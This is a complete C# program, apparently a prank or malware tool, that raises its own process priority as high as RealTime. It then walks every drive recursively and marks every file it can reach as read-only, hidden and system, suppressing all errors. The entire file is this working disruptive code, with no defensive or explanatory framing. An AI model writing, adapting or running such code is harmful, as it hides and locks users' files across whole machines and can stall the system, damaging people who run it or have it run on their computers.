/*
 * Marks every file it can as a read only, hidden system file
 */

using System;
using System.Diagnostics;
using System.IO;

namespace Systemize
{
    internal class Program
    {
        private static void SetHighPriority() // Try to get the highest priority it can
        {
            try
            {
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.AboveNormal;
            }
            catch (Exception) { }

            try
            {
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.High;
            }
            catch (Exception) { }

            try
            {
                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
            }
            catch (Exception) { }
        }

        private static void HideDirectory(string path)
        {
            if (string.IsNullOrWhiteSpace(path) || !Directory.Exists(path)) return;

            DirectoryInfo di = new DirectoryInfo(path);

            try // Try city
            {
                foreach (DirectoryInfo d in di.GetDirectories("*"))
                {
                    try
                    {
                        HideDirectory(d.FullName);
                    }
                    catch (Exception) { }
                }

                foreach (FileInfo f in di.GetFiles("*"))
                {
                    try
                    {
                        FileAttributes atr = File.GetAttributes(f.FullName);
                        File.SetAttributes(f.FullName, atr | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception) { }
        }

        static void Main(string[] args)
        {
            SetHighPriority();

            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                HideDirectory(d.Name);
            }
        }
    }
}
